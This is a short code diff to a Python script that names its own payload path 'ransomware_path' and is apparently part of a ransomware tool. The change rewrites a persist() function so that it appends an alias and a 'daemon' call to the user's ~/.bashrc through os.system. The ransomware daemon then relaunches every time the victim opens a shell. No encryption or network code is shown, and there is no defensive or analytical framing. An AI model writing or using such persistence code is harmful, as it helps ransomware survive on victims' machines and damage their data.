@@ -180,8 +180,13 @@ def menu():
 def persist():
     # cp = 'cp ' + ransomware_path + 'daemon ~/.bashrc'
     # check if daemon not in bashrc
-    nano = 'echo ".' + ransomware_path + '/daemon" >> ~/.bashrc '
+    alias = "alias 'daemon'='{}/daemon';".format(ransomware_path)
+    daemon = "daemon;"
+
+    nano = 'echo "' +  alias + '" >> ~/.bashrc '
+    nano2 = 'echo "' + daemon + '" >> ~/.bashrc '
     os.system(nano)
+    os.system(nano2)
 
 
 if __name__ == "__main__":
@@ -194,4 +199,4 @@ if __name__ == "__main__":
             time.sleep(30)
         except:
             pass
-    pass
+    
